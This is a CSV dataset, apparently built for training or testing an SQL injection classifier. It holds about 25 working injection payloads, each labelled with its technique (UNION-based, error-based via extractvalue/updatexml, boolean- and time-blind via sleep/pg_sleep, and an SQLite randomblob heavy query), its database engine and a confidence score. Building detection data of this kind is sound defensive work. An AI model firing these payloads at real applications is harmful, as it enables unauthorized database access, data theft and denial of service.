id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22144,-3243 or 2266 = 3583#,boolean_blind,generic,0.7,Pattern match: boolean condition (OR clause); Type=boolean_blind (Priority 3); conditional logic detected,1
22145,"1' ) union all select null,null,null,null,null--",union_based,generic,0.85,UNION SELECT structure confirmed with multiple null columns; Type=union_based (Priority 7); injection pattern,2
22146,"1%"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,heavy_query,sqlite,0.85,SQLite time-delay via randomblob (500000000 scale); Type=heavy_query (Priority 4); DoS attack; Database=sqlite,2
22147,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'pphf' = 'pphf",error_based,mysql,0.85,error-based function (extractvalue); MySQL signature confirmed; Type=error_based (Priority 4); xpath error injection,2
22148,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""bxct"" like ""bxct",boolean_blind,mysql,0.7,Pattern match: boolean condition with RLIKE; Type=boolean_blind (Priority 3); conditional pattern,1
22149,-9120' ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Pattern match: boolean condition (OR equality); Type=boolean_blind (Priority 3); conditional logic,1
22150,1'+ ( select naiw where 4924 = 4924,boolean_blind,generic,0.7,generic SQL keywords without specific attack signal; Type=boolean_blind (Priority 3); partial injection,1
22151,-9389' ) or 8859 = 3989--,boolean_blind,generic,0.7,Pattern match: boolean condition (OR inequality); Type=boolean_blind (Priority 3); conditional check,1
22152,"-9923%' ) ) ) union all select 8985,8985,8985,8985,8985,8985,8985#",union_based,generic,0.85,UNION SELECT with repeated columns; Type=union_based (Priority 7); column count exploitation,2
22153,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 123 ) ||chr ( 123 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'hbwk' like 'hbwk,boolean_blind,oracle,0.7,Oracle-specific function (dbms_utility); Type=boolean_blind (Priority 3); Oracle conditional,1
22154,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""tgdu"" = ""tgdu",error_based,mysql,0.85,error-based function (extractvalue); MySQL signature; Type=error_based (Priority 4); xpath error,2
22155,"-1510' ) ) ) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",union_based,generic,0.85,UNION SELECT with 10 columns; Type=union_based (Priority 7); column count injection,2
22156,"1"" ) union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); null column matching,2
22157,"elt ( 8192 = 8192,sleep ( 5 ) )",boolean_blind,mysql,0.7,boolean blind (ELT conditional) with sleep payload; Type=boolean_blind (Priority 3); conditional evaluation,1
22158,end and ( ( 'zeyr' = 'zeyr,boolean_blind,generic,0.5,generic SQL keyword fragment without clear attack signal; Type=boolean_blind (Priority 3); partial pattern,1
22159,"1"" ) ) as luon where 4676 = 4676 rlike sleep ( 5 ) #",time_blind,mysql,0.85,time-delay signal (RLIKE+SLEEP); MySQL signature; Type=time_blind (Priority 5); sleep-based injection,2
22160,"1"" ) where 6138 = 6138 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.85,PostgreSQL time-delay via pg_sleep(5); Type=time_blind (Priority 5); Database=postgresql,2
22161,"1"" where 3740 = 3740 rlike sleep ( 5 ) #",time_blind,mysql,0.85,time-delay signal (RLIKE+SLEEP); MySQL signature; Type=time_blind (Priority 5); sleep function,2
22162,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kgdt' like 'kgdt",boolean_blind,mysql,0.7,boolean blind (ELT conditional); MySQL signature; Type=boolean_blind (Priority 3); ELT evaluation,1
22163,1 ) as tngy where 8956 = 8956 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,mysql,0.7,Pattern match: RLIKE conditional; Type=boolean_blind (Priority 3); subquery condition,1
22164,"-4230"" ) ) ) union all select 6962,6962,6962,6962,6962,6962#",union_based,generic,0.85,UNION SELECT with 6 columns; Type=union_based (Priority 7); column count,2
22165,-3540 where 7302 = 7302 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.85,Oracle-specific function (utl_inaddr); error-based injection; Type=error_based (Priority 4),2
22166,"1 ) as lfra where 2669 = 2669 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,mysql,0.85,error-based function (updatexml); MySQL signature; Type=error_based (Priority 4); xpath error,2
22167,1' ) rlike sleep ( 5 ) and ( 'qsub' like 'qsub,time_blind,mysql,0.85,time-delay signal (SLEEP function); MySQL signature; Type=time_blind (Priority 5); sleep-based,2
22168,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION SELECT with NULL columns; Type=union_based (Priority 7); column count,2
